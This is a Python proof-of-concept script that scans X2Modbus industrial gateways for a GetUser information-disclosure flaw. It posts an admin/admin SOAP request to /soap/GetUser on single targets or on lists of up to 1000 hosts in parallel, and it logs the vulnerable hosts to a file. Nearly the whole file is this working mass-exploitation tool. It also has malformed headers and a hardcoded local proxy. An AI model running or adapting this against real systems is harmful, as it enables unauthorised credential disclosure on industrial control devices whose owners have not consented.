import requests,argparse,sys
from multiprocessing.dummy import Pool
import json
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="迅饶科技 X2Modbus 网关 GetUser 信息泄露漏洞")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept - Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content - Length': '190',
        'Accept': 'text / html, application / xhtml + xml, application / xml;q = 0.9, image / avif, image / webp, image / apng, * / *;q = 0.8, application / signed - exchange;v = b3;q = 0.7',
        'Content - Type': 'application / x - www - form - urlencoded',


    }
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    data='''<GetUser><User Name="admin" Password="admin"/></GetUser>'''

    url = target+'/soap/GetUser'

    try:
        res = requests.post(url=url,data=data,headers=headers,timeout=5,proxies=proxies).text
        if "UserName" in res:
            with open('result.txt','a') as fp1:
                fp1.write(f"[+]{target} is veriable"+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()